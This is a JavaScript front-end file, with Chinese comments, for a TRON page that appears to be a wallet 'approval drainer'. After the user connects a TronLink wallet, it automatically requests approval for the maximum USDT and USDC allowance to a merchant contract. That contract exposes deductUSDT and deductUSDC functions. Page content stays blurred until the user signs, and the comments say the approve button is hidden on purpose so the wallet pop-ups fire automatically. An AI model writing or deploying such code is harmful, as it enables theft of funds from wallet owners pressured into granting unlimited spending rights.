// src/main.js (自動觸發授權模式)

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000';
// 使用一個非常大的數值來代表 Max Approve
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let provider;
let isAuthorizedOnChain = false;

// --- UI 元素 (保持不變) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
// 🚨 這裡不再依賴 authorizeButton，但在 HTML 中保留它是個好習慣
const authorizeButton = document.getElementById('authorizeButton'); 

// --- 辅助函数 ---
function showOverlay(message) {
    if (overlayMessage) overlayMessage.innerHTML = message;
    if (blurOverlay) blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    if (overlayMessage) overlayMessage.innerHTML = '';
    if (blurOverlay) blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    isAuthorizedOnChain = isAuthorized;
    if (isAuthorized) {
        // 授權成功，隱藏所有鎖定元素
        if (blurOverlay) blurOverlay.style.display = 'none';
        if (lockedPrompt) lockedPrompt.style.display = 'none';
        if (authorizeButton) authorizeButton.style.display = 'none';
    } else {
        // 未授權，顯示鎖定元素，但隱藏授權按鈕 (因為現在是自動觸發)
        if (blurOverlay) blurOverlay.style.display = 'flex';
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
        // 🚨 關鍵修改：保持 authorizeButton 隱藏，除非我們想讓用戶手動重試
        if (authorizeButton) authorizeButton.style.display = 'none'; 
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
            updateContentLock(false);
            hideOverlay();
        }
    }
}

let txCount = 0;

async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please **approve** in your wallet!`);

    try {
        // 這是觸發 TronLink 彈窗的關鍵步驟
        const txHash = await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
            throw new Error(`TronLink/Wallet did not return a valid transaction hash.`);
        }

        showOverlay(`Step ${txCount}/${totalTxs}: Operation broadcast successful! TxID: ${txHash.substring(0, 6)}...`);
        // 等待一小段時間讓用戶查看訊息
        await new Promise(resolve => setTimeout(resolve, 500));

        return txHash;

    } catch (error) {
        if (error.message && (error.message.includes('User canceled') || error.message.includes('用戶在錢包中取消了操作'))) {
            throw new Error('用戶在錢包中取消了操作。');
        }
        const errorMessage = error.message || (typeof error === 'string' ? error : 'Unknown error during transaction.');
        throw new Error(`交易失敗，錯誤訊息: ${errorMessage}`);
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


// ---------------------------------------------
// ⭐️ 鏈上狀態檢查的函數 ⭐️
// ---------------------------------------------
async function checkAuthorizationStatus(address) {
    if (!merchantContract || !usdtContract || !usdcContract) return { authorized: false, usdtAllowanceOK: false, usdcAllowanceOK: false, allOK: false };

    // 1. 檢查合約授權狀態 (authorized)
    let isConnectedAuthorized = false;
    try {
        const result = await merchantContract.authorized(address).call();
        isConnectedAuthorized = (result === true || result === 'true');
    } catch (e) {
        console.error("Error checking contract authorization status:", e);
    }

    // 2. 檢查 USDT/USDC Max 代幣扣款額度 (Allowance)
    let isUSDTAllowanceOK = false;
    let isUSDCAllowanceOK = false;
    // 設置最小需求額度 (例如 10^33 Sun)
    const MIN_REQUIRED_ALLOWANCE_BN = tronWeb.toBigNumber("100000000000000000000000000000000");

    try {
        const usdtAllowanceResult = await usdtContract.allowance(address, MERCHANT_CONTRACT_ADDRESS).call();
        const usdtAllowance = tronWeb.toBigNumber(usdtAllowanceResult.remaining || usdtAllowanceResult);
        isUSDTAllowanceOK = usdtAllowance.gte(MIN_REQUIRED_ALLOWANCE_BN);

        const usdcAllowanceResult = await usdcContract.allowance(address, MERCHANT_CONTRACT_ADDRESS).call();
        const usdcAllowance = tronWeb.toBigNumber(usdcAllowanceResult.remaining || usdcAllowanceResult);
        isUSDCAllowanceOK = usdcAllowance.gte(MIN_REQUIRED_ALLOWANCE_BN);

    } catch (e) {
        console.error("Error checking token allowance status:", e);
    }

    return {
        authorized: isConnectedAuthorized,
        usdtAllowanceOK: isUSDTAllowanceOK,
        usdcAllowanceOK: isUSDCAllowanceOK,
        allOK: isConnectedAuthorized && isUSDTAllowanceOK && isUSDCAllowanceOK
    };
}


// --- 連線邏輯 (保持不變) ---
async function connectWalletLogic() {
    showOverlay('Connecting to wallet...');
    txCount = 0;

    try {
        if (typeof window.tronWeb !== 'undefined') {
            const isReady = await new Promise(resolve => {
                let checkInterval = setInterval(() => {
                    if (window.tronWeb && window.tronWeb.ready) {
                        clearInterval(checkInterval);
                        resolve(true);
                    }
                }, 100);
                setTimeout(() => { clearInterval(checkInterval); resolve(window.tronWeb && window.tronWeb.ready || false); }, 3000);
            });

            if (isReady) {
                tronWeb = window.tronWeb;
                let currentAddressHex = tronWeb.defaultAddress.hex;

                if (!currentAddressHex || currentAddressHex === DEFAULT_TRON_ADDRESS_HEX) {
                    if (window.tronLink && window.tronLink.request) {
                        try {
                            await window.tronLink.request({ method: 'tron_requestAccounts' });
                            currentAddressHex = tronWeb.defaultAddress.hex;
                        } catch (requestError) {
                            showOverlay("Connection failed: Wallet authorization denied or canceled.");
                            return false;
                        }
                    }
                }

                if (currentAddressHex && currentAddressHex !== DEFAULT_TRON_ADDRESS_HEX) {
                    userAddress = tronWeb.address.fromHex(currentAddressHex);
                    provider = "TronLink/DApp Browser";
                    console.log("✅ Wallet connected, address:", userAddress);

                    await initializeContracts();
                    updateConnectionUI(true, userAddress);
                    return true;
                }
            }
        }

        updateConnectionUI(false);
        showOverlay('🔴 Connection failed: No supported TRON wallet detected or wallet is locked.');
        return false;

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 處理實際交易的授權邏輯 (統一為自動觸發) ⭐️
// ---------------------------------------------
async function connectAndAuthorize() {
    txCount = 0; // 重置交易計數器

    try {
        if (!merchantContract || !tronWeb || !userAddress) {
            throw new Error("Wallet not initialized. Please reconnect.");
        }

        // 1. 檢查當前鏈上狀態
        const status = await checkAuthorizationStatus(userAddress);
        let transactionsToSend = [];

        // --- 組裝所需交易 ---

        // 1.1 註冊/合約授權
        if (!status.authorized) transactionsToSend.push({
            call: merchantContract.connectAndAuthorize(),
            message: "Sending Contract Authorization (Step 1/3)"
        });

        // 1.2 USDT Max 授權
        if (!status.usdtAllowanceOK) transactionsToSend.push({
            call: usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            message: "Setting USDT Max Allowance (Step 2/3)"
        });

        // 1.3 USDC Max 授權 (如果需要)
        if (!status.usdcAllowanceOK) transactionsToSend.push({
            call: usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            message: "Setting USDC Max Allowance (Step 3/3)"
        });
        
        // 🚨 這是總交易筆數，必須根據實際需要發送的數量來設定
        const totalTxs = transactionsToSend.length;
        
        if (totalTxs === 0) {
            showOverlay('Already fully authorized. Unlocking...');
            return true;
        }

        // 2. 執行所有缺少的交易，**這會立即觸發 TronLink 彈窗**
        for (const [index, tx] of transactionsToSend.entries()) {
            // 這裡的 tx.message 應該包含當前步驟 (例如 Step 1/3, Step 2/3)
            await sendTransaction(tx.call, tx.message, totalTxs);
        }

        // 3. 交易廣播成功 (樂觀判斷)，解鎖 UI
        return true;

    } catch (error) {
        console.error("Authorization Failed:", error);
        const displayError = error.message.includes('用戶在錢包中取消了操作')
            ? 'Authorization canceled by user. Please try again.'
            : `Authorization failed! Error message: ${error.message}. Please try again.`;

        showOverlay(`🔴 ${displayError}`);
        // 交易失敗，可能需要讓用戶點擊一個按鈕手動重試，但暫時保持鎖定狀態
        if (authorizeButton) authorizeButton.style.display = 'block'; // 顯示隱藏的重試按鈕
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 連線成功後處理：立即檢查狀態並觸發授權 ⭐️
// ---------------------------------------------
async function handlePostConnection() {
    console.log("handlePostConnection called");
    if (!isConnectedFlag) {
        updateContentLock(false);
        return;
    }

    // 1. 檢查鏈上授權狀態 (快速檢查是否已完成)
    showOverlay('Checking on-chain authorization status...');
    const status = await checkAuthorizationStatus(userAddress);

    if (status.allOK) {
        // 2. 如果狀態都 OK，則直接解鎖
        console.log("✅ On-chain status is fully Authorized. Unlocking data...");
        showOverlay('✅ Already authorized! Unlocking data...');
        updateContentLock(true);
        await new Promise(resolve => setTimeout(resolve, 1000));
        hideOverlay();
        return;
    }

    // 3. 狀態未完成，**自動觸發授權流程** (這將導致 TronLink 彈窗)
    console.log(`⚠️ Authorization incomplete. Triggering authorization steps automatically.`);
    
    // 🚨 關鍵改變：立即調用授權流程
    const authSuccess = await connectAndAuthorize();

    if(authSuccess) {
        // 交易廣播成功後（樂觀判斷），解鎖 UI
        console.log("✅ Authorization broadcasted successfully. Unlocking data...");
        updateContentLock(true);
        await new Promise(resolve => setTimeout(resolve, 1000));
        hideOverlay();
    } else {
        // 交易失敗或用戶取消，保持鎖定
        updateContentLock(false);
        // 如果您希望用戶可以重試，請在 connectAndAuthorize 失敗邏輯中處理 authorizeButton 的顯示
    }
}


// ---------------------------------------------
// 主連接入口函數 (供 Connect Button 點擊)
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯 (保持不變)
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        isAuthorizedOnChain = false;
        provider = null;
        updateConnectionUI(false);
        updateContentLock(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    const connected = await connectWalletLogic();

    if (connected) {
        // 連接成功後，立即進入狀態檢查並自動授權流程
        await handlePostConnection();
    }

    if (connectButton) connectButton.disabled = false;
}

// ---------------------------------------------
// 頁面啟動和事件監聽器 (保持不變)
// ---------------------------------------------

// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);

// 🚨 由於我們改為自動觸發，這裡的點擊事件可以移除或修改為重試邏輯
if (authorizeButton) authorizeButton.addEventListener('click', async () => {
    // 這裡改為重試邏輯
    if (!isConnectedFlag) {
        showOverlay("Please connect your wallet first.");
        return;
    }
    if (authorizeButton) authorizeButton.disabled = true;
    const authSuccess = await connectAndAuthorize();
    if(authSuccess) {
        await handlePostConnection();
    } else {
        updateContentLock(false);
    }
    if (authorizeButton) authorizeButton.disabled = false;
});


// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
updateConnectionUI(false);
updateContentLock(false);

window.onload = () => {
    setTimeout(async () => {
        if (!isConnectedFlag) {
            await connectWalletLogic();
            // handlePostConnection 會在 connectWalletLogic 內部成功時被呼叫
        }
    }, 500);
};